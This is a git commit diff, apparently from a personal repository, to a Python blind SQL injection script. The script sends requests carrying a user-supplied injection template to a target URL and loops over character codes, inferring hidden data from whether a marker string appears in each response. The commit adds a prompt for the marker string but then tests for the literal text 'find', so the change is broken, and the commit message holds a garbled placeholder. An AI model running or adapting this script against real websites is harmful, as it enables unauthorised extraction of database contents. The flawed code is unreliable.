ad23b93df29da86ad143678b1ba96865386394bd
whb54012 <1226844928@qq.com>
2026-07-28 01:50:21 +0000

    自动提交：更新 ${2026/7/28 09:50ilenAM50e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -7,13 +7,14 @@ result=int(input("输入查找长度"))
 url = input("输入url及注入点")
 # url="http://localhost:3000/%E7%BD%91%E9%A1%B5/%E4%B8%BB%E9%A1%B5/%E9%9F%B3%E4%B9%90.php"
 data=input("输入注入语句")
+find=input("需要查找的字符串")
 # data='?c=11{}{}123'
 def fun(url,result,result2):
     # 
         for i in range(result2):
             print(i)
             reponse=requests.get(url+data.format(result,i))
-            if 'login.php' in reponse.text:
+            if 'find' in reponse.text:
                 print(result,chr(i)+"\n")
                 break
         return
